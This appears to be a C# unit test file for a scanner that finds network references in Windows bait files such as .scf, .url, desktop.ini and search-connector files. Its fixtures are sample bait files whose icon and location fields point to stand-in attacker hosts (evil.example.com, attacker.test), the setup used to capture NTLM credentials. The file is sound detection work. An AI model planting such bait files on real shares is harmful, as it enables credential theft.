using System.Text;
using ShareGuard.Core.Models;
using ShareGuard.Core.Parsers;
using Xunit;

namespace ShareGuard.Tests;

public class TextBaitParserTests
{
    [Fact]
    public void Scf_IconFileUnc_IsExtracted()
    {
        var content = Encoding.ASCII.GetBytes("""
            [Shell]
            Command=2
            IconFile=\\evil.example.com\share\icon.ico
            [Taskbar]
            Command=ToggleDesktop
            """);
        var refs = new ScfParser().Parse("bait.scf", content);
        Assert.Contains(refs, r => r.Host == "evil.example.com" && r.Scheme == ReferenceScheme.Unc);
    }

    [Fact]
    public void Scf_LocalIcon_HasNoHost()
    {
        var content = Encoding.ASCII.GetBytes("[Shell]\nIconFile=%SystemRoot%\\system32\\shell32.dll\n");
        var refs = new ScfParser().Parse("normal.scf", content);
        Assert.All(refs, r => Assert.Null(r.Host));
    }

    [Fact]
    public void Url_File_ParsesUrlAndIconFile()
    {
        var content = Encoding.Unicode.GetBytes("""
            [InternetShortcut]
            URL=https://portal.attacker.test/landing
            IconIndex=0
            IconFile=\\evil.example.com\icons\i.ico
            """);
        var refs = new UrlParser().Parse("bait.url", content);
        Assert.Contains(refs, r => r.Scheme == ReferenceScheme.Http && r.Host == "portal.attacker.test");
        Assert.Contains(refs, r => r.Scheme == ReferenceScheme.Unc && r.Host == "evil.example.com");
    }

    [Fact]
    public void DesktopIni_UncIcon_IsExtractedButLocalIconsIgnored()
    {
        var content = Encoding.UTF8.GetBytes("""
            [.ShellClassInfo]
            IconResource=C:\Windows\System32\imageres.dll,-102
            IconFile=\\evil.example.com\share\folder.ico
            """);
        var refs = new DesktopIniParser().Parse("desktop.ini", content);
        Assert.Contains(refs, r => r.Host == "evil.example.com");
        Assert.DoesNotContain(refs, r => r.Host != null && r.Host.Contains("imageres"));
    }

    [Fact]
    public void SearchConnector_ExtractsSimpleLocationAndIcon()
    {
        var content = Encoding.UTF8.GetBytes("""
            <?xml version="1.0" encoding="UTF-8"?>
            <searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchconnector">
              <isSearchOnlyFromSuggestedLocations>false</isSearchOnlyFromSuggestedLocations>
              <iconReference>\\evil.example.com\icons\s.ico</iconReference>
              <simpleLocation>
                <url>\\evil.example.com\shared</url>
              </simpleLocation>
            </searchConnectorDescription>
            """);
        var refs = new SearchConnectorParser().Parse("evil.searchConnector-ms", content);
        Assert.Contains(refs, r => r.Host == "evil.example.com");
    }

    [Fact]
    public void LibraryFile_ExtractsNetworkUrls()
    {
        var content = Encoding.UTF8.GetBytes("""
            <libraryDescription>
              <iconReference>\\filer.corp.example.com\lib\i.ico</iconReference>
              <searchConnectorDescriptionList>
                <searchConnectorDescription>
                  <simpleLocation><url>\\filer.corp.example.com\docs</url></simpleLocation>
                </searchConnectorDescription>
              </searchConnectorDescriptionList>
            </libraryDescription>
            """);
        var refs = new SearchConnectorParser().Parse("docs.library-ms", content);
        Assert.All(refs, r => Assert.Equal("filer.corp.example.com", r.Host));
    }

    [Fact]
    public void Osdx_TemplateUrl_IsExtracted()
    {
        var content = Encoding.UTF8.GetBytes("""
            <OpenSearchDescription>
              <Url type="application/rss+xml" template="https://search.attacker.test/search?q={searchTerms}"/>
            </OpenSearchDescription>
            """);
        var refs = new SearchConnectorParser().Parse("evil.osdx", content);
        Assert.Contains(refs, r => r.Host == "search.attacker.test" && r.Scheme == ReferenceScheme.Http);
    }

    [Fact]
    public void MalformedXml_StillRecoversUncByRegex()
    {
        var content = Encoding.UTF8.GetBytes("<broken><url>\\\\evil.example.com\\x</url><!-- no closing doc");
        var refs = new SearchConnectorParser().Parse("broken.searchConnector-ms", content);
        Assert.Contains(refs, r => r.Host == "evil.example.com");
    }

    [Fact]
    public void XmlNamespaceDeclarations_AreNotTreatedAsNetworkReferences()
    {
        // xmlns 是 schema 声明,不产生网络连接,不能把 schemas.microsoft.com 报成外发主机
        var content = Encoding.UTF8.GetBytes("""
            <searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchconnector"
                                        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
              <simpleLocation><url>\\evil.example.com\shared</url></simpleLocation>
            </searchConnectorDescription>
            """);
        var refs = new SearchConnectorParser().Parse("x.searchConnector-ms", content);
        Assert.DoesNotContain(refs, r => r.Host != null &&
            (r.Host.Contains("microsoft.com") || r.Host.Contains("w3.org")));
        Assert.Contains(refs, r => r.Host == "evil.example.com");
    }
}
